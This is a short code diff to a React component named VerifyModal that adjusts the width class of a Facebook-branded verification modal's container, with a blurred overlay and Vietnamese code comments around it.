@@ -93,7 +93,7 @@ const VerifyModal: FC<{ nextStep: () => void; businessName?: string }> = ({ next
             {/* Overlay mờ toàn màn hình */}
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-3 sm:p-4 md:p-6'>
-                <div className='flex max-h-[95vh] w-full max-w-xs sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4 sm:p-5 md:p-6'>
+                <div className='flex max-h-[95vh] w-[90vw] max-w-xs sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4 sm:p-5 md:p-6'>
                     {/* Header with user info and Facebook branding */}
                     <div className='pb-3 sm:pb-4 md:pb-5'>
                         <p className='text-xs sm:text-sm md:text-sm text-gray-600'>{businessName || 'User'} • Facebook</p>
